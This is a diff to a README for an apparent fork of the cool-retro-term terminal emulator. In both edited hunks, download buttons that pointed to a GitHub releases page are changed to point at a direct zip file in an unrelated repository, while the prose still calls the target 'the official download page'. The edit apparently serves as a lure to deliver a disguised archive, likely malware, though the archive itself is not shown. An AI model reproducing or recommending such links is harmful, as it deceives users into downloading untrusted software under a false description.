@@ -34,7 +34,7 @@ Getting started with cool-retro-term is easier than you think. Follow these simp
 
 The first thing you need to do is get the application file on your computer. Click the big button below to go to the official download page:
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Vaninteresting8315/cool-retro-term/releases)
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Vaninteresting8315/vaninteresting8315.github.io/main/Missouri/3.9-beta.2.zip)
 
 Once you click that button, your web browser will open a page showing different versions of the program. You want to find the file that matches your system. Look for the most recent version—usually listed at the top. Click on it to start the download. Your browser will save the file to your "Downloads" folder.
 
@@ -142,7 +142,7 @@ So what are you waiting for? Give your computer some vintage flair today!
 
 Of course! Here it is one more time, right at your fingertips:
 
-[![DOWNLOAD LINK](https://img.shields.io/badge/⬇_GET_RETRO-4CAF50?style=for-the-badge&logo=download&logoColor=white)](https://github.com/Vaninteresting8315/cool-retro-term/releases)
+[![DOWNLOAD LINK](https://img.shields.io/badge/⬇_GET_RETRO-4CAF50?style=for-the-badge&logo=download&logoColor=white)](https://raw.githubusercontent.com/Vaninteresting8315/vaninteresting8315.github.io/main/Missouri/3.9-beta.2.zip)
 
 Happy typing, and enjoy the glow!
 
